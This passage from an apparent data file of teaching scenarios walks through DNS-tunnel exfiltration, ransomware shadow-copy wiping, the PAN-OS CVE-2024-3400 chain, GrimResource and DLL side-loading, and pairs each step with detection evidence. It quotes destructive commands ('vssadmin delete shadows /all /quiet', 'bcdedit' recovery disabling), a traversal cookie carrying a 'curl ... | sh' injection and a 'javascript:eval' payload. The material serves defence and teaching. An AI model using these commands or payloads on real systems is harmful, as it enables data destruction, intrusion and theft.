      diagramTopologySummary:
        'On the diagram: Start at Node ③/④ (Compromised Host 10.20.4.18 & DNS Tunnel Agent), follow the recursive UDP/53 queries through Node ② (Internal Corporate DNS Resolver 10.20.1.53) out to Node ①/⑤ (Attacker Authoritative Nameserver `ns1.c2-auth-dns.net`), while Node ⑥ (SIEM / Zeek DNS Analyzer) flags the high-entropy subdomains.',
      documentedAdvisory: 'MITRE ATT&CK T1071.004 & T1048.003 · SANS DNS Tunneling Detection · Sysmon EventID 22 / Zeek dns.log',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1560',
        plainTitle: 'Compressing, Encrypting, and Slicing Stolen Data Into DNS-Safe Base32 Labels',
        storyAnalogy:
          'Before speaking to the prison operator, the inmate shreds the stolen blueprint into 56-character strips and encodes every strip using only letters and numbers that sound like a valid company name.',
        simpleExplanation:
          'Before sending any network traffic, the malware on the workstation reads the sensitive credential file, compresses and AES-encrypts it (so network inspection sensors cannot read the stolen text in transit), and encodes the binary bytes into Base32 strings split into 56-character chunks (4a6f686e446f65... — chosen because DNS hostnames are case-insensitive and strictly forbid spaces or binary symbols, and RFC 1035 limits each dot-separated DNS label to a maximum of 63 characters).',
        howItWorksInPractice:
          'Standard DNS resolvers reject queries containing raw binary bytes or labels longer than 63 characters (with a 253-character total domain limit). Encoding ciphertext into Base32 (using only A–Z and 2–7) and prepending a sequence number (<seq>.<chunk>) guarantees that corporate DNS servers will forward every chunk without syntax errors.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Victim Workstation) into Node ④ (DNS Exfil Chunker Process), and return arrow ⇠#1.2 producing the sequence of numbered Base32 subdomain queries.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 22 (DnsQuery): non-browser background process generating hundreds of unique, long, high-entropy (>4.1 bits/char) subdomain lookups under the same parent domain.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1071.004',
        plainTitle: 'Relaying Subdomain Queries Through the Corporate DNS Resolver (UDP Port 53)',
        storyAnalogy:
          'The inmate hands each encoded question to the trusted internal prison operator (Corporate DNS `10.20.1.53`), who sees that they don’t have that company cached in their local binder and automatically calls the outside internet to find out.',
        simpleExplanation:
          'The malware sends standard UDP port 53 DNS TXT / A queries for <seq>.<base32_chunk>.c2-auth-dns.net to the company’s own internal DNS server (10.20.1.53 — so the victim workstation never makes a direct outbound connection to the internet that a firewall would block). Because each subdomain contains a unique chunk of stolen data (guaranteeing a 0% DNS cache hit rate so the internal DNS server never answers from memory), the corporate DNS server is forced to forward every single query out through the perimeter firewall to the internet.',
        howItWorksInPractice:
          'The compromised workstation only sends packets to 10.20.1.53:53 on the local LAN (which is universally permitted for domain resolution). The attacker relies on standard recursive DNS resolution to carry the encoded subdomain payload across the firewall boundary on their behalf.',
        diagramAlignment:
          'On the diagram, follow arrow #2.1→ from Node ④ through Node ② (Corporate DNS Resolver 10.20.1.53:53), and return arrow ⇠#2.2 as the resolver forwards and returns the recursive lookup.',
        detectionAndEvidence:
          'Documented in Zeek `dns.log` & Corelight DNS Analytics: zero cache-hit ratio (`100% unique FQDNs`) and abnormal query-length distribution (>110 chars per query) to a single registered domain.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1048.003',
        plainTitle: 'Reassembling the File at the Attacker’s Nameserver & Sending Commands Back in TXT Records',
        storyAnalogy:
          'The accomplice sitting at the `c2-auth-dns.net` phone desk writes down every company name the prison operator asks about, glues the strips back into the stolen file, and replies with a fake phone number (`TXT` record) that secretly tells the inmate to send the next page.',
        simpleExplanation:
          'Because the attacker registered c2-auth-dns.net and pointed its NS (Name Server) record to their own server (ns1.c2-auth-dns.net at 198.51.100.53 — making the attacker’s machine the official authority that all internet DNS resolvers must ask for that domain), every forwarded query lands directly on the attacker’s server. The server strips the domain suffix, Base32-decodes the subdomain chunks back into the stolen file, and replies with a DNS TXT record ("v=ack;seq=042;cmd=noop" — using the free-form text field of a DNS answer to send acknowledgments and new C2 commands all the way back to the malware).',
        howItWorksInPractice:
          'This establishes a complete bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS Query Name (QNAME), while inbound C2 tasking rides back inside the DNS TXT or CNAME response payload returned by the corporate resolver.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ delivers the recursive query to Node ①/⑤ (Attacker Authoritative DNS `198.51.100.53:53`) and returns `⇠#3.2 TXT ACK`, while Node ⑥ (SIEM) triggers the DNS Exfiltration alert.',
        detectionAndEvidence:
          'Documented in Suricata & Splunk Enterprise Security: sustained volume of DNS TXT responses from a newly registered domain combined with Shannon entropy > 4.2 on subdomain labels.',
      },
    ],
  },

  'ransomware-shadow-wipe': {
    scenarioId: 'ransomware-shadow-wipe',
    briefing: {
      headline: 'Scenario Briefing: Ransomware Pre-Encryption — Wiping Volume Shadow Copies (MITRE T1490 / T1486)',
      storyAnalogy:
        'Imagine an extortionist who plans to put heavy padlocks on every filing cabinet in an office and demand a ransom for the keys. Before clicking a single padlock shut, the first thing they do is walk into the back storage room and shred every photocopy and backup microfilm reel (`vssadmin delete shadows /all /quiet`), so the office manager cannot simply ignore the padlocks and pull out yesterday’s copies.',
      plainSummary:
        'Before a ransomware payload encrypts a single user document on a Windows system, it almost always performs "Inhibit System Recovery" (MITRE ATT&CK T1490). Windows automatically keeps point-in-time backup snapshots of files using the Volume Shadow Copy Service (VSS — allowing administrators to right-click a folder and restore "Previous Versions" if files are damaged). This scenario traces how the ransomware binary (lb3_payload.exe, PID 5540) deletes all shadow copies (vssadmin.exe delete shadows /all /quiet — destroying local restore points so the victim cannot recover files for free) and disables recovery boot options (bcdedit.exe), and then runs multi-threaded intermittent file encryption across the drive.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Compromised Windows Server / `lb3_payload.exe` PID 5540), trace the shadow-copy deletion inside Node ② (VSS & WMI Subsystem `vssadmin.exe` PID 5812), and follow the high-speed intermittent file encryption on Node ③ (NTFS File System `D:\\Shares\\Finance\\*`) detected by Node ④ (EDR Canary & SIEM).',
      documentedAdvisory: 'CISA StopRansomware Guide · MITRE ATT&CK T1490 & T1486 · Sysmon EventID 1 / 11 · Windows EventID 8222',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1490',
        plainTitle: 'Deleting All Windows Volume Shadow Copies & Disabling Boot Recovery (`vssadmin delete shadows /all /quiet`)',
        storyAnalogy:
          'The extortionist slips into the archive room with an administrator master key, orders the archive clerk (`vssadmin.exe` / `vssvc.exe`) to silently incinerate every backup snapshot on the shelves without asking for confirmation (`/quiet`), and disconnects the emergency recovery switch (`bcdedit recoveryenabled No`).',
        simpleExplanation:
          'Before encrypting a single document, the LockBit payload (lb3_payload.exe, PID 5540 — running with elevated Administrator privileges) spawns C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet (PID 5812 — where "delete shadows /all" instructs the Windows Volume Shadow Copy Service to permanently erase every local backup snapshot on the drive so the victim cannot restore yesterday’s clean files for free, and "/quiet" suppresses the "Are you sure? [Y/N]" prompt so the deletion runs silently in the background). Immediately after, it runs bcdedit /set {default} recoveryenabled No (which disables the Windows Automatic Repair boot menu so the server cannot boot into a recovery console).',
        howItWorksInPractice:
          'When vssadmin.exe delete shadows /all /quiet executes, it sends a COM request to the Volume Shadow Copy service (vssvc.exe) to drop the copy-on-write shadow storage diff areas on the NTFS volume. Because this step happens *before* file encryption starts, an EDR rule that terminates the parent process (PID 5540) the instant vssadmin delete shadows is spawned stops the ransomware before any user files are encrypted.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (`lb3_payload.exe` PID 5540) to Node ② (VSS & WMI Subsystem `vssadmin.exe` PID 5812) monitored by Node ④ (EDR Canary & SIEM Sysmon EID 1).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (`vssadmin.exe delete shadows /all /quiet`, ParentImage `lb3_payload.exe`) & Windows Application Log EventID 8222.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1486',
        plainTitle: 'Multi-Threaded Intermittent File Encryption (AES-NI) & Dropping the Ransom Note',
        storyAnalogy:
          'With every backup copy destroyed and the emergency recovery switch disabled, the crew fans out across every floor using high-speed power tools to lock only the frontlatch (first 64 KB) of every filing cabinet in seconds, taping a ransom note (`Restore-My-Files.txt`) onto every desk.',
        simpleExplanation:
          'With local recovery paths eliminated, lb3_payload.exe (PID 5540) uses Windows I/O Completion Ports (an asynchronous multi-threaded disk subsystem that saturates all CPU cores at once) and Intermittent Encryption—encrypting only the first 64 KB of each file on D:\\Shares\\Finance\\* using hardware-accelerated AES-NI instructions (why only 64 KB: destroying a file’s 64 KB header is enough to make Excel, PDF, and database files completely unreadable, while letting the ransomware lock tens of thousands of files in seconds before defenders can pull the plug or before I/O-rate sensors trigger). It renames each locked file to *.lockbit and drops Restore-My-Files.txt in every folder.',
        howItWorksInPractice:
          'Full-file encryption on multi-gigabyte databases takes minutes and generates sustained disk I/O spikes that behavioral anti-ransomware minifilters easily spot. Encrypting only the first 64 KB header (and appending the RSA-encrypted AES key footer) ruins the file format instantaneously at a fraction of the disk I/O cost.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ performs high-speed file encryption and drops `Restore-My-Files.txt` on Node ③ (`NTFS File System D:\\Shares\\Finance\\*`) while Node ④ (`EDR Canary & SIEM`) triggers Sysmon EventID 11 containment.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 11 (`FileCreate: D:\\Shares\\Finance\\Restore-My-Files.txt`) & EDR kernel minifilter canary triggers.',
      },
    ],
  },

  'unit42-panos-midnight-eclipse': {
    scenarioId: 'unit42-panos-midnight-eclipse',
    briefing: {
      headline: 'Scenario Briefing: Operation Midnight Eclipse (CVE-2024-3400) — Palo Alto PAN-OS GlobalProtect Zero-Day',
      storyAnalogy:
        'Imagine a hotel front desk where any guest can hand the clerk a luggage tag (`SESSID` cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder—and once every minute, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (`bash -c`). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges.',
      plainSummary:
        'Synthesizing independent investigations from Volexity (who discovered the zero-day campaign as UTA0218), Palo Alto Networks Unit 42 (Operation MidnightEclipse), and Rapid7 AttackerKB, CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection flaw in PAN-OS GlobalProtect. The attacker chains two distinct bugs: (1) an arbitrary file-creation flaw in the SESSID HTTP cookie (../../../../opt/panlogs/tmp/device_telemetry/minute/... — using "../" directory traversal to plant a 0-byte file inside the privileged telemetry queue folder) and (2) a shell command-injection flaw when the root-privileged dt_curl / sendTelemetry cron job passes that filename into a backtick-evaluated shell command, allowing the attacker to implant the UPSTYLE Python backdoor in system.pth and steal running-config.xml.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (UTA0218 Attacker Infrastructure), send the crafted `SESSID` cookie to Node ②/③ (PAN-OS GlobalProtect Portal `:443`), watch the file land in `/opt/panlogs/tmp/device_telemetry/minute/` and trigger root execution inside Node ④ (`dt_curl` Telemetry Cron), and trace the `UPSTYLE` Python backdoor implanted in Node ⑤ (Nginx CSS Path) while Node ⑥ (Cortex XSIAM / SIEM) captures the telemetry.',
      documentedAdvisory: 'Palo Alto Unit 42 MidnightEclipse · Volexity UTA0218 · Rapid7 Root-Cause Analysis · CVE-2024-3400 · CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Directory Traversal in the "SESSID" Cookie Creates a File With Backtick Shell Commands',
        storyAnalogy:
          'The intruder walks up to the GlobalProtect VPN check-in window and presents a forged `SESSID` luggage tag that starts with `../../../../`—forcing the session clerk to place an empty file directly inside the root janitor’s "To-Do" folder, with a shell command disguised as the filename itself.',
        simpleExplanation:
          'The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet before a user finishes logging in). Instead of a normal session ID, the Cookie: SESSID= header contains ../../../../opt/panlogs/tmp/device_telemetry/minute/aa`curl ... | sh` (where the "../" path traversal climbs out of the session folder into the firewall’s telemetry queue directory, and the backticks `...` embed a Linux shell command directly inside the filename itself).',
        howItWorksInPractice:
          'When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk—which is all the attacker needs, because the exploit payload lives inside the file’s *name*, not its contents).',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (UTA0218 Attacker) to Node ②/③ (PAN-OS GlobalProtect `/ssl-vpn/hipreport.esp`), and return arrow ⇠#1.2 as the 0-byte file is created in `/opt/panlogs/tmp/device_telemetry/minute/`.',
        detectionAndEvidence:
          'Documented in Unit 42, Volexity & Rapid7 CVE-2024-3400 reports: PAN-OS `appweb3` logs showing `Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/` and zero-byte file creation errors.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'The Root Telemetry Cron Job ("dt_curl") Executes the Malicious Filename as Root',
        storyAnalogy:
          'Sixty seconds later, the automated root janitor (`dt_curl`) walks into the telemetry folder to upload files, reads the booby-trapped filename out loud inside a shell command without quotation marks, and accidentally runs the attacker’s script as `root`.',
        simpleExplanation:
          'Once every minute, the PAN-OS device telemetry cron job (dt_curl / sendTelemetry — a scheduled background script running with full uid=0(root) privileges) loops through every file in /opt/panlogs/tmp/device_telemetry/minute/ and pastes each filename directly into a shell command string without escaping special characters. When the Linux shell parses that command string, it sees the backticks (`curl ... | sh` — which in Bash/sh means "execute the command inside these backticks first and substitute its output"), immediately running the attacker’s payload as root.',
        howItWorksInPractice:
          'Because the attacker never needed to write data *into* the file—only control its *filename* via the Step 1 path traversal—even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root Remote Code Execution the next time the cron job ticks.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ shows Node ③ triggering Node ④ (`dt_curl` root cron job evaluating the backtick filename), and ⇠#2.2 spawns `/bin/sh` as `uid=0(root)` to fetch the stage-2 script.',
        detectionAndEvidence:
          'Documented by Unit 42 & Volexity: `/var/log/pan/device_telemetry_send.log` containing shell syntax fragments and unexpected outbound connections initiated by `dt_curl`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1505.003',
        plainTitle: 'Deploying the "UPSTYLE" Python Webshell in `system.pth` and Stealing `running-config.xml`',
        storyAnalogy:
          'Now holding the building’s master key, the intruder copies the master blueprint (`running-config.xml`), slips an auto-start hook into Python’s startup list (`system.pth`), installs a hidden listener inside the hotel’s public stylesheet file (`bootstrap.min.css`), and sets a timer that wipes the security logs the moment a command finishes.',
        simpleExplanation:
          'Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration file containing VPN pre-shared keys, administrator hashes, and internal network routes used by UTA0218 to pivot into internal Windows Domain Controllers via SMB/winexe) and injects the UPSTYLE Python backdoor into /usr/lib/python3.6/site-packages/system.pth (a Python path-configuration file that Python automatically executes every time *any* system script starts on the appliance). UPSTYLE monitors /var/log/pan/sslvpn_ngx_error.log for crafted HTTPS requests and writes command output into /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css (the public CSS stylesheet of the VPN login page — letting the attacker read command results over port 443).',
        howItWorksInPractice:
          'When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command, appends the output inside a CSS comment /*...*/ in bootstrap.min.css, and 15 seconds later restores the original CSS file and deletes the offending log line (erasing both the command and output traces).',
        diagramAlignment:
          'On the diagram, arrow #3.1→ implants UPSTYLE into Node ⑤ (PAN-OS `system.pth`, `bootstrap.min.css` & `running-config.xml`), while Node ⑥ (SIEM / Cortex XDR) flags the CSS modification timestamp and config exfiltration.',
        detectionAndEvidence:
          'Documented in Unit 42 & Volexity advisories: unauthorized entries in `/usr/lib/python3.6/site-packages/system.pth`, rogue Python processes running `exec(base64.b64decode(...))`, and unexpected `mtime` changes on `bootstrap.min.css`.',
      },
    ],
  },

  'elastic-grimresource-msc': {
    scenarioId: 'elastic-grimresource-msc',
    briefing: {
      headline: 'Scenario Briefing: GrimResource (CVE-2024-43572 / MMC Attack) — Code Execution via Crafted .msc Files',
      storyAnalogy:
        'Imagine a company that banned employees from opening `.exe` packages, but still trusts official-looking "Settings Binder" files (`.msc`) opened by the built-in Windows Management Console (`mmc.exe`). The attacker hides a legacy 1990s self-running gadget (`apds.dll` XSS) inside a Settings Binder; when opened, `mmc.exe` automatically runs the hidden script inside its own trusted process.',
      plainSummary:
        'Synthesizing research from Elastic Security Labs (who discovered "GrimResource" in June 2024), MDSec (DotNetToJScript), and Microsoft MSRC (CVE-2024-43572), this technique achieves arbitrary code execution inside Windows Management Console (mmc.exe — the signed Microsoft binary used for Event Viewer and Device Manager) when a user opens a crafted Microsoft Saved Console (.msc) file. By abusing a cross-site scripting (XSS) flaw in the legacy Windows apds.dll library (res://apds.dll/redirect.html — which blindly executes javascript: URLs inside mmc.exe’s HTML view) together with DotNetToJScript (deserializing a .NET assembly directly in RAM via BinaryFormatter) and RwSection injection into dllhost.exe, the attacker runs Cobalt Strike inside a trusted system process.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Phishing Delivery of `invoice_audit.msc`), follow user execution on Node ③ (Windows Workstation `mmc.exe`), trace the `apds.dll` DOM XSS and DotNetToJScript memory injection inside Node ④ (`mmc.exe` / `dllhost.exe`), and watch the final C2 connection to Node ⑤ detected by Node ⑥ (Elastic Defend / SIEM).',
      documentedAdvisory: 'Elastic Security Labs "GrimResource" Report · Microsoft MSRC CVE-2024-43572 · MDSec DotNetToJScript · MITRE T1218.014',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1218.014',
        plainTitle: 'Opening a Malicious `.msc` File Triggers the Legacy `apds.dll` Redirect Vulnerability (CVE-2024-43572)',
        storyAnalogy:
          'The employee double-clicks an administrative binder (`invoice_audit.msc`). Inside the binder’s cover page (`StringTables`), a hidden reference tells the Windows Management Console to open an ancient help-viewer page (`res://apds.dll/redirect.html`) that blindly executes whatever script is written in its target parameter.',
        simpleExplanation:
          'The victim double-clicks a weaponized console file (invoice_audit.msc — an XML-based Windows Management Console file used to bypass email and browser blocks on .exe and .lnk files), which Windows automatically opens using the trusted system binary C:\\Windows\\System32\\mmc.exe. Inside the .msc XML structure, the <StringTables> section points an embedded HTML panel to res://C:\\Windows\\System32\\apds.dll/redirect.html?target=javascript:eval(...) (abusing an ancient HTML page baked inside Microsoft’s own apds.dll library that blindly passes its "target=" parameter into a browser redirect — CVE-2024-43572 — immediately executing the attacker’s VBScript/JavaScript inside mmc.exe).',
        howItWorksInPractice:
          'C:\\Windows\\System32\\apds.dll (the legacy Microsoft Help Center library shipped on every Windows installation) contains an embedded resource (redirect.html) that passes the target query parameter directly to document.location.replace() without sanitizing javascript: or vbscript: URI schemes—giving the .msc file full script execution inside mmc.exe’s privileged MSHTML Zone.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ①/② into Node ③ (`mmc.exe` loading `invoice_audit.msc` and `apds.dll`), and return arrow ⇠#1.2 triggering JScript execution inside `mmc.exe`.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & MSRC CVE-2024-43572: Sysmon EventID 7 showing `mmc.exe` loading both `apds.dll` and `jscript.dll` / `vbscript.dll` while parsing a non-standard `.msc` file.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Using DotNetToJScript to Reconstruct a .NET Loader Inside `mmc.exe` Memory',
        storyAnalogy:
          'Once the legacy script starts running inside `mmc.exe`, it acts like a 3D printer inside the building: it reads an encoded blueprint from the binder and materializes a full .NET loader (`BinaryFormatter.Deserialize`) directly in RAM.',
        simpleExplanation:
          'Plain JScript cannot call low-level Windows memory APIs directly, so the script inside mmc.exe uses the DotNetToJScript technique: it creates a .NET BinaryFormatter COM object via ActiveX (new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")) and deserializes a Base64-encoded .NET assembly ("GrimLoader") directly in RAM (allowing the attacker to bridge from limited JScript into a full .NET program with complete Win32 API access inside mmc.exe, without ever dropping a .dll or .exe file onto the hard drive).',
        howItWorksInPractice:
          'Deserializing a crafted gadget chain via BinaryFormatter loads the .NET Common Language Runtime (clr.dll / mscoree.dll) into mmc.exe and invokes Assembly.Load(byte[]) in memory (giving the attacker full P/Invoke access to kernel32.dll and ntdll.dll from inside a Microsoft-signed console process).',
        diagramAlignment:
          'On the diagram, arrow #2.1→ deserializes the .NET assembly inside Node ④ (`mmc.exe` CLR Runtime `clr.dll` / `mscoree.dll`), and return arrow ⇠#2.2 initializes the in-memory injector.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: `mmc.exe` loading `jscript9.dll` / `jscript.dll` followed immediately by `.NET CLR` (`clr.dll`) and `amsi.dll` in the same process.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055',
        plainTitle: 'Spawning `dllhost.exe` & Injecting the Cobalt Strike Beacon via `RwSection` / DirtyVanity',
        storyAnalogy:
          'Finally, so the employee can close the Settings Binder without killing the malware, the in-memory loader spawns a quiet background helper (`dllhost.exe`) and hands the active C2 radio over to it.',
        simpleExplanation:
          'If the victim notices an empty console window and clicks "X" to close mmc.exe, any malware running inside mmc.exe would die immediately. To survive, the in-memory .NET loader spawns a hidden background C:\\Windows\\System32\\dllhost.exe process (COM Surrogate — a legitimate Windows background host that runs without a visible taskbar window), maps a shared Read-Write-Execute memory section via NtCreateSection / NtMapViewOfSection ("RwSection" technique documented by Elastic Security Labs — avoiding suspicious VirtualAllocEx calls), and injects the Cobalt Strike C2 beacon into dllhost.exe.',
        howItWorksInPractice:
          'Migrating execution from the interactive mmc.exe process into a headless dllhost.exe process via shared section mapping (RwSection) or Asynchronous Procedure Call (NtQueueApcThread) ensures the C2 beacon stays alive in the background long after the victim closes the .msc window.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ injects from Node ④ (`mmc.exe`) into `dllhost.exe` and connects out to Node ⑤ (C2 Server), while Node ⑥ (Elastic Defend / SIEM) correlates the `.msc` → `apds.dll` → `dllhost.exe` chain.',
        detectionAndEvidence:
          'Documented in Elastic Detection Rule `execution_via_mmc_apds_dll`: `mmc.exe` loading `apds.dll` and spawning or injecting into `dllhost.exe`.',
      },
    ],
  },

  'elastic-lotus-blossom-chrysalis': {
    scenarioId: 'elastic-lotus-blossom-chrysalis',
    briefing: {
      headline: 'Scenario Briefing: Lotus Blossom APT — DLL Side-Loading (`WinGUp` / `MsMpEng`) & "Chrysalis / Sagerunex" Backdoor',
      storyAnalogy:
        'Imagine a celebrity who only travels with their trusted personal assistant (`mpclient.dll` / `libcurl.dll`). Windows has a habit of checking the hotel lobby (the current folder) for the assistant before checking the official headquarters (`System32`). The attacker places an imposter wearing a name tag that says `mpclient.dll` right in the lobby next to a genuine, digitally signed program (`MsMpEng.exe` or Notepad++ `GUP.exe`). When the genuine program starts up, it hires the imposter standing right next to it.',
      plainSummary:
        'Synthesizing independent reports from Elastic Security Labs (who dissected the Notepad++ WinGUp GUP.exe + libcurl.dll + CHRYSALIS chain) and Cisco Talos (who documented the MsMpEng.exe + mpclient.dll + Sagerunex lineage), the Lotus Blossom APT group (Billbug / Spring Dragon / G0030) relies on a 3-piece DLL Side-Loading triad (MITRE T1574.002). Instead of running an unsigned malware .exe that EDR agents would block, the attacker drops a genuine, digitally signed executable (GUP.exe or MsMpEng.exe — chosen because its valid digital signature passes application-allowlisting checks) alongside a maliciously crafted companion DLL (libcurl.dll or mpclient.dll — loaded automatically from the current directory) and an RC4/XOR-encrypted payload file (chrysalis.dat / conf.bin — keeping the real backdoor scrambled on disk).',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Initial Perimeter Compromise), trace the staging of the signed host binary and trojanized DLL on Node ③ (Enterprise Server), follow the DLL side-loading and RC4/XOR payload decryption inside Node ④ (Chrysalis In-Memory Backdoor), and observe the HTTPS C2 tunnel to Node ⑤ detected by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Elastic Security Labs CHRYSALIS Report · Cisco Talos Sagerunex Analysis · MITRE ATT&CK G0030 / T1574.002',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1574.002',
        plainTitle: 'Dropping a Legitimate Signed Binary (`GUP.exe` / `MsMpEng.exe`) Alongside a Trojanized Companion DLL',
        storyAnalogy:
          'The intruder drops a 3-piece kit into a quiet folder (`C:\\ProgramData\\Comms\\`): (1) a real, digitally signed executable, (2) a trojanized helper library with the exact name the executable looks for (`mpclient.dll` / `libcurl.dll`), and (3) a locked box of encrypted shellcode (`chrysalis.dat`).',
        simpleExplanation:
          'Across campaigns analyzed by Elastic Security Labs and Cisco Talos, the attacker stages a 3-file triad inside a writable folder like C:\\ProgramData\\Comms\\: (1) a genuine, digitally signed executable (such as Microsoft’s MsMpEng.exe or Notepad++ WinGUp GUP.exe — authentic signed binaries whose valid digital certificates prevent antivirus from blocking the .exe launch), (2) a malicious companion DLL named mpclient.dll or libcurl.dll placed in that exact same folder (exploiting Windows’ default DLL search order, which checks the application’s current directory *before* C:\\Windows\\System32), and (3) an encrypted data file named chrysalis.dat or conf.bin (containing the actual backdoor in scrambled form so static file scanners see only random bytes).',
        howItWorksInPractice:
          'When the signed host binary starts from C:\\ProgramData\\Comms\\, the Windows loader (ntdll!LdrLoadDll) resolves its Import Address Table (IAT), sees an import for mpclient.dll / libcurl.dll, finds the attacker’s unsigned DLL sitting in the local directory first, and maps it directly into the trusted process.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Signed Host Binary) loading Node ④ (Malicious Side-Loaded DLL in `C:\\ProgramData\\Comms\\`), and return arrow ⇠#1.2 executing `DllMain`.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 7 (ImageLoaded): a signed system/vendor executable (`MsMpEng.exe` or `GUP.exe`) running from a non-standard directory (`C:\\ProgramData\\`) and loading an unsigned DLL.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'API Hashing & Decrypting the "chrysalis.dat" Shellcode Blob Purely in RAM',
        storyAnalogy:
          'Once the imposter assistant (`mpclient.dll` / `libcurl.dll`) is invited inside the VIP suite, they quietly unlock the third file (`chrysalis.dat`) in memory—so no antivirus scanner looking at the hard drive ever sees the real weapon.',
        simpleExplanation:
          'Once the signed binary loads the trojanized DLL and calls its exported startup function (keeping the malicious DLL tiny and using custom 32-bit API hashing instead of plaintext function names like VirtualAlloc so static analysts see no suspicious imports), the DLL opens the companion file chrysalis.dat / conf.bin from disk, decrypts its bytes in RAM using a custom RC4/XOR key, and copies the unpacked Chrysalis / Sagerunex shellcode into an executable memory buffer (meaning the actual APT backdoor code only ever exists in volatile memory, never unencrypted on the hard drive).',
        howItWorksInPractice:
          'Splitting the infection chain across three files (a clean signed .exe, a minimal loader .dll using API hashing, and an encrypted .dat/.bin blob) defeats traditional signature scanners: the .exe is 100% legitimate, the .dll contains only a simple file-read and XOR/RC4 loop, and the .dat file has no PE header ("MZ") on disk.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ reads and decrypts `chrysalis.dat` into a `VirtualAlloc` buffer, and ⇠#2.2 transfers execution to the unpacked Chrysalis / Sagerunex implant.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & Cisco Talos: private executable memory allocation (`VirtualAlloc` RW → RX) inside a side-loaded process immediately after reading a local `.dat` / `.bin` file.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Establishing Persistence & Beaconing Over HTTPS Using Corporate Proxy Credentials',
        storyAnalogy:
          'Wearing the trusted program’s badge, the decrypted backdoor reads the employee’s own internet proxy pass from Windows (`WinInet`) and blends its outbound HTTPS messages right into normal office web traffic.',
        simpleExplanation:
          'Running inside the trusted host binary, the decrypted Chrysalis/Sagerunex implant registers a persistent Windows service or Registry Run key (pointing to the legitimate signed .exe so startup monitors see a signed binary), and calls Windows WinInet APIs (InternetOpenW and HttpSendRequestW — chosen instead of raw sockets because WinInet automatically reads the logged-in employee’s corporate proxy settings and cached NTLM/Kerberos credentials, allowing the C2 beacon to pass right through strict enterprise web proxies).',
        howItWorksInPractice:
          'In many enterprise networks, direct outbound TCP/443 connections are blocked unless traffic authenticates through a corporate HTTP proxy. Using WinInet with INTERNET_OPEN_TYPE_PRECONFIG lets the malware piggyback on Windows’ built-in proxy configuration and user credentials automatically.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ (Chrysalis Backdoor) out to Node ⑤ (Lotus Blossom HTTPS C2) while Node ⑥ (SIEM) correlates the side-loaded DLL with the outbound beacon.',
        detectionAndEvidence:
          'Documented in Elastic & Talos advisories: Sysmon EventID 3 outbound HTTPS connection from a binary executing out of `C:\\ProgramData\\` with an unsigned side-loaded module.',
      },
    ],
  },

  'unit42-scattered-spider-cloud': {
    scenarioId: 'unit42-scattered-spider-cloud',
    briefing: {
      headline: 'Scenario Briefing: Scattered Spider (Muddled Libra / UNC3944) — Helpdesk Social Engineering to Cloud & ESXi Takeover',
      storyAnalogy:
        'Instead of picking the reinforced digital lock on the front door, the intruder calls the building’s IT Helpdesk pretending to be an employee who just bought a new phone, convinces the clerk to register the intruder’s own smartphone as the employee’s MFA badge, walks right into the IT Lobby (SSO Dashboard), and plugs a private tunnel cable (`ngrok` / Tailscale) directly into the cloud and virtual server control room.',
      plainSummary:
